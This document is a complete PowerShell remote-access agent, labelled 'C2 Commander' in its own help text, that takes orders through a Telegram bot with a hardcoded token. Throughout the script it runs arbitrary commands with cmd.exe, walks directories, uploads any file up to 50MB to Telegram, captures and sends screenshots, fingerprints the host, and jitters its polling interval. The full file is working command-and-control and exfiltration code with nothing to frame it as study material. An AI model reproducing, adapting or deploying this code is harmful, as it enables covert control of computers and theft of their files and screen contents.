param([switch]$Silent)

$bt = [char]96
$nl = [Environment]::NewLine
$C2Dir = Split-Path -Parent $MyInvocation.MyCommand.Path
$DataDir = "$env:USERPROFILE\.chatbox-c2"
[void](New-Item -ItemType Directory -Path $DataDir -Force)
[void](New-Item -ItemType Directory -Path "$DataDir\downloads" -Force)
$LogFile = "$DataDir\relay.log"
$IdFile = "$DataDir\machine-id"

if (!(Test-Path $IdFile)) {
  $id = -join ((48..57)+(97..102) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
  [System.IO.File]::WriteAllText($IdFile, $id)
}
$InstanceId = [System.IO.File]::ReadAllText($IdFile).Trim()
$Hostname = $env:COMPUTERNAME

$Drives = @()
Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | ForEach-Object {
  $Drives += @{drive=$_.DeviceID; total=[Math]::Floor($_.Size/1GB); free=[Math]::Floor($_.FreeSpace/1GB)}
}
$TailIP = ""
try { $o = & "C:\Program Files\Tailscale\tailscale.exe" ip -4 2>$null; if ($LASTEXITCODE -eq 0 -and $o) { $TailIP = $o.Trim() } } catch {}

$Token = "1809469058:AAGhSDi9uO0_upwjUUgYqQiwnXYfhQIMSzk"
$Bot = "https://api.telegram.org/bot$Token"
$PollIntervalMs = 30000
$ChatId = ""

function Log($M) {
  try { [System.IO.File]::AppendAllText($LogFile, "[$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ssZ')] $M$nl") } catch {}
}

function Tg($Method, $Body) {
  try {
    $j = ($Body | ConvertTo-Json -Compress)
    $b = [System.Text.Encoding]::UTF8.GetBytes($j)
    $r = [System.Net.WebRequest]::CreateHttp("$Bot/$Method")
    $r.Method = "POST"; $r.ContentType = "application/json"
    $r.ContentLength = $b.Length; $r.Timeout = 25000
    $s = $r.GetRequestStream(); $s.Write($b,0,$b.Length); $s.Close()
    $resp = $r.GetResponse()
    $rd = New-Object System.IO.StreamReader($resp.GetResponseStream())
    $t = $rd.ReadToEnd(); $rd.Close(); $resp.Close()
    return ($t | ConvertFrom-Json)
  } catch { return $null }
}

function TgFile($Path) {
  try {
    $name = [System.IO.Path]::GetFileName($Path)
    $fb = [System.IO.File]::ReadAllBytes($Path)
    $bound = "----" + [DateTime]::Now.Ticks.ToString("x")
    $ms = New-Object System.IO.MemoryStream
    $hdr = "--$bound`r`nContent-Disposition: form-data; name=`"document`"; filename=`"$name`"`r`nContent-Type: application/octet-stream`r`n`r`n"
    $hb = [System.Text.Encoding]::UTF8.GetBytes($hdr); $ms.Write($hb,0,$hb.Length)
    $ms.Write($fb,0,$fb.Length)
    $ft = "`r`n--$bound--`r`n"
    $fbb = [System.Text.Encoding]::UTF8.GetBytes($ft); $ms.Write($fbb,0,$fbb.Length)
    $body = $ms.ToArray(); $ms.Close()
    $r = [System.Net.WebRequest]::CreateHttp("$Bot/sendDocument?chat_id=$ChatId")
    $r.Method = "POST"; $r.ContentType = "multipart/form-data; boundary=$bound"
    $r.ContentLength = $body.Length; $r.Timeout = 60000
    $s = $r.GetRequestStream(); $s.Write($body,0,$body.Length); $s.Close()
    $resp = $r.GetResponse(); $resp.Close()
  } catch { Log "tg file err: $($_.Exception.Message)" }
}

function Say($T) {
  if ($ChatId) { Tg "sendMessage" @{chat_id=$ChatId; text=$T; parse_mode="Markdown"} }
}

function ExecLocal($Cmd, $A) {
  $r = ""
  try {
    switch ($Cmd) {
      "exec" { $r = (& cmd.exe /c $A 2>&1 | Out-String) }
      "ls" {
        $d = if ($A) { $A } else { "C:\" }
        $r = (Get-ChildItem -Path $d -ErrorAction Stop | ForEach-Object { @{name=$_.Name; dir=$_.PsIsContainer; size=if($_.PsIsContainer){0}else{$_.Length}} } | ConvertTo-Json -Depth 5 -Compress)
      }
      "tree" {
        $p = $A -split '\|'
        $d = if ($p[0]) { $p[0] } else { "C:\" }
        $md = if ($p[1]) { [int]$p[1] } else { 5 }
        function T($dir, $dep) { $o=""; if ($dep -gt $md) { return ("  "*$dep)+"...$nl" }; try { Get-ChildItem -Path $dir -ErrorAction Stop | ForEach-Object { if ($_.PsIsContainer) { $o += ("  "*$dep)+"[DIR] "+$_.Name+"$nl"; $o += T $_.FullName ($dep+1) } else { $o += ("  "*$dep)+"[FIL] "+$_.Name+"$nl" } } } catch {}; return $o }
        $r = T $d 0
      }
      "listall" {
        $p = $A -split '\|'
        $d = if ($p[0]) { $p[0] } else { "C:\" }
        $md = if ($p[1]) { [int]$p[1] } else { 10 }
        $li = New-Object System.Collections.ArrayList
        function W($dir, $dep) { if ($dep -gt $md) { return }; try { Get-ChildItem -Path $dir -ErrorAction Stop | ForEach-Object { [void]($li.Add(@{name=$_.Name;path=$_.FullName;dir=$_.PsIsContainer;size=if($_.PsIsContainer){0}else{$_.Length};mtime=$_.LastWriteTime.ToString("yyyy-MM-ddTHH:mm:ssZ")})); if ($_.PsIsContainer) { W $_.FullName ($dep+1) } } } catch {} }
        $r = ($li | ConvertTo-Json -Depth 5 -Compress)
      }
      "dl" {
        if (!(Test-Path -LiteralPath $A -PathType Leaf)) { $r = "Error: File not found: $A"; break }
        $f = Get-Item -LiteralPath $A -ErrorAction Stop
        if ($f.Length -gt 50MB) { $r = "Error: File too large ($([Math]::Round($f.Length/1MB))MB > 50MB)"; break }
        $b64 = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($A))
        $r = "{`"name`":`"$($f.Name)`",`"size`":$($f.Length),`"data`":`"$b64`"}"
      }
      "screenshot" {
        Add-Type -AssemblyName System.Drawing -ErrorAction Stop
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        $sb = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp = New-Object System.Drawing.Bitmap $sb.Width, $sb.Height
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $g.CopyFromScreen($sb.X, $sb.Y, 0, 0, $sb.Size); $g.Dispose()
        $ms = New-Object System.IO.MemoryStream
        $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png); $bmp.Dispose()
        $b64 = [Convert]::ToBase64String($ms.ToArray())
        $len = $ms.Length; $ms.Dispose()
        $r = "{`"name`":`"screenshot.png`",`"size`":$len,`"data`":`"$b64`"}"
      }
      default { $r = "Unknown command: $Cmd" }
    }
  } catch { $r = "Error: $($_.Exception.Message)" }
  return $r
}

function CodeFence($T) {
  return "${bt}${bt}${bt}${nl}$T${bt}${bt}${bt}"
}

function Handle($U) {
  $m = $U.message
  if (!$m -or !$m.text) { return }
  $t = $m.text.Trim()
  $Script:ChatId = $m.chat.id
  Log "cmd: $t"
  $parts = $t -split '\s+'
  $c = $parts[0].ToLower()

  if ($c -eq "/status") {
    $dstr = @()
    foreach ($d in $Drives) { $dstr += "$($d.drive) ($($d.free)GB/$($d.total)GB free)" }
    $msg = "*Machine Registry*${nl}${nl}*Online*${nl}  ${Hostname} (${InstanceId})${nl}"
    $msg += "    IP: ${bt}${TailIP}${bt}${nl}    Drives: $($dstr -join ', ')${nl}"
    $msg += "    Uptime: $([Math]::Floor([Environment]::TickCount / 3600000))h${nl}"
    Say $msg

  } elseif ($c -eq "/ls") {
    $target = $parts[1]
    $dir = if ($parts.Count -gt 2) { ($parts[2..($parts.Count-1)] -join ' ') } else { "C:\" }
    if (!$target) { Say "Usage: /ls [machine] [path]" } else {
      $res = ExecLocal "ls" $dir
      $trunc = $res.Substring(0, [Math]::Min(3000, $res.Length))
      $hdr = "*${target}:* ${bt}${dir}${bt}"
      Say "${hdr}${nl}$(CodeFence $trunc)"
    }

  } elseif ($c -eq "/dl") {
    $target = $parts[1]
    $fp = if ($parts.Count -gt 2) { ($parts[2..($parts.Count-1)] -join ' ') } else { "" }
    if (!$target -or !$fp) { Say "Usage: /dl [machine] [filepath]" } else {
      $hdr = "Pulling ${bt}$fp${bt} from *${target}*..."
      Say $hdr
      $res = ExecLocal "dl" $fp
      try {
        $p = $res | ConvertFrom-Json
        if ($p.data) {
          $buf = [Convert]::FromBase64String($p.data)
          $out = "$DataDir\downloads\$($p.name)"
          [System.IO.File]::WriteAllBytes($out, $buf)
          TgFile $out
          $sz = [Math]::Round($p.size/1024, 1)
          Say "*${target}:* ${bt}$fp${bt}${nl}Size: ${sz}KB"
        } else {
          $trunc = $res.Substring(0, [Math]::Min(2000, $res.Length))
          Say "*${target}:* ${bt}$fp${bt}${nl}$(CodeFence $trunc)"
        }
      } catch {
        $trunc = $res.Substring(0, [Math]::Min(2000, $res.Length))
        Say "*${target}:* ${bt}$fp${bt}${nl}$(CodeFence $trunc)"
      }
    }

  } elseif ($c -eq "/exec") {
    $target = $parts[1]
    $exCmd = if ($parts.Count -gt 2) { ($parts[2..($parts.Count-1)] -join ' ') } else { "" }
    if (!$target -or !$exCmd) { Say "Usage: /exec [machine] [command]" } else {
      $res = ExecLocal "exec" $exCmd
      $trunc = $res.Substring(0, [Math]::Min(3000, $res.Length))
      $hdr = "*${target}:* ${bt}$exCmd${bt}"
      Say "${hdr}${nl}$(CodeFence $trunc)"
    }

  } elseif ($c -eq "/tree") {
    $target = $parts[1]
    $argsA = if ($parts.Count -gt 2) { ($parts[2..($parts.Count-1)] -join ' ') } else { "C:\" }
    if (!$target) { Say "Usage: /tree [machine] [path] [maxdepth]" } else {
      $res = ExecLocal "tree" $argsA
      $dd = $argsA.Split('|')[0]
      $trunc = $res.Substring(0, [Math]::Min(3000, $res.Length))
      $hdr = "*${target}:* ${bt}${dd}${bt}"
      Say "${hdr}${nl}$(CodeFence $trunc)"
    }

  } elseif ($c -eq "/listall") {
    $target = $parts[1]
    $argsA = if ($parts.Count -gt 2) { ($parts[2..($parts.Count-1)] -join ' ') } else { "C:\" }
    if (!$target) { Say "Usage: /listall [machine] [path] [maxdepth]" } else {
      $res = ExecLocal "listall" $argsA
      $dd = $argsA.Split('|')[0]
      try {
        $items = $res | ConvertFrom-Json
        $lines = @()
        foreach ($ix in $items) {
          $tag = if ($ix.dir) { "[DIR]" } else { "[FIL]" }
          $lines += "$tag $($ix.name)  $([Math]::Round($ix.size/1024,1))KB  $($ix.mtime.Substring(0,10))"
        }
        $ic = $items.Count
        $chunks = @()
        $hdr = "*${target}:* ${bt}${dd}${bt} (${ic} items)"
        $chunk = "${hdr}${nl}${bt}${bt}${bt}${nl}"
        foreach ($line in $lines) {
          if (($chunk.Length + $line.Length + 7) -gt 4000) {
            $chunks += $chunk + "${bt}${bt}${bt}"
            $chunk = "${bt}${bt}${bt}${nl}$line${nl}"
          } else { $chunk += "$line${nl}" }
        }
        $chunks += $chunk + "${bt}${bt}${bt}"
        foreach ($cx in $chunks) { Say $cx }
      } catch {
        $trunc = $res.Substring(0, [Math]::Min(3000, $res.Length))
        $hdr = "*${target}:* ${bt}${dd}${bt}"
        Say "${hdr}${nl}$(CodeFence $trunc)"
      }
    }

  } elseif ($c -eq "/screenshot") {
    $target = $parts[1]
    if (!$target) { Say "Usage: /screenshot [machine]" } else {
      Say "Capturing screenshot from *${target}*..."
      $res = ExecLocal "screenshot" ""
      try {
        $p = $res | ConvertFrom-Json
        if ($p.data) {
          $out = "$DataDir\downloads\ss_$([DateTime]::Now.Ticks).png"
          [System.IO.File]::WriteAllBytes($out, [Convert]::FromBase64String($p.data))
          TgFile $out
          $sz = [Math]::Round($p.size/1024, 1)
          Say "*${target}:* Screenshot captured (${sz}KB)"
        } else {
          $trunc = $res.Substring(0, [Math]::Min(2000, $res.Length))
          Say "*${target}:* $trunc"
        }
      } catch {
        $trunc = $res.Substring(0, [Math]::Min(2000, $res.Length))
        Say "*${target}:* $trunc"
      }
    }

  } elseif ($c -eq "/start" -or $c -eq "/help") {
    $help = "*C2 Commander*${nl}${nl}"
    $help += "/status - Show all machines${nl}/ls [machine] [path] - List directory${nl}"
    $help += "/listall [machine] [path] [depth] - Full recursive listing${nl}"
    $help += "/tree [machine] [path] [depth] - Directory tree${nl}"
    $help += "/dl [machine] [filepath] - Pull file to Telegram${nl}"
    $help += "/exec [machine] [command] - Run command${nl}/screenshot [machine] - Take screenshot${nl}"
    Say $help
  }
}

Log "Relay starting on ${Hostname} (${InstanceId})"
$offset = 0
while ($true) {
  try {
    $r = [System.Net.WebRequest]::CreateHttp("$Bot/getUpdates?offset=$offset&timeout=20")
    $r.Timeout = 25000
    $resp = $r.GetResponse()
    $rd = New-Object System.IO.StreamReader($resp.GetResponseStream())
    $body = $rd.ReadToEnd(); $rd.Close(); $resp.Close()
    $data = $body | ConvertFrom-Json
    if ($data.ok -and $data.result) {
      foreach ($upd in $data.result) {
        $offset = $upd.update_id + 1
        Handle $upd
      }
    }
  } catch {}
  Log "poll done, offset=$offset"
  Start-Sleep -Milliseconds ($PollIntervalMs + (Get-Random -Maximum 10000))
}
